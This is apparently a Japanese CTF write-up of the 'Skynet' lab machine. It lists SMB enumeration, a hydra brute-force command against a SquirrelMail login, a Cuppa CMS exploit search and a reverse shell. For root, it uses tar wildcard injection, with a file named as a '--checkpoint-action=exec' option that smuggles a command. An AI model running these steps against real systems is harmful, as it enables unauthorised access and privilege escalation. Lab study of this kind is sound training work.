---
title: "Skynet"
date: 2024-03-16T11:17:21+09:00
draft: false
---

### user.txt

- smb なので enum4linux
  - anonymous
  - milesdyson
- anonymous でアクセスするとファイルがもらえる
  - パスワードリストをもってくる
- ```hydra -l milesdyson -P log1.txt [IP] http-form-post "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."```
- squirrelmail にアクセス
  - )s{A&2Z=F^n_E.B` を受け取る
- smb に milesdyson でアクセス
  - ```smbclient //10.10.35.53/milesdyson --user=milesdyson```
  - ```/45kra24zxs28v3yd``` というディレクトリがあるらしい
- ```gobuster dir -u http://10.10.35.53/45kra24zxs28v3yd```
  - cuppa が使われている
- ```searchsploit cuppa CMS```
  - リバースシェルを立てる
  
### root.txt

- crontab

``` shell
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

``` shell
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

- ワイルドカードがあるのでオプションのやつが刺さる
  - shell.sh を ```chmod 777 /root```
  - ```–-checkpoint-action=exec=sh shell.sh``` というファイルも作る
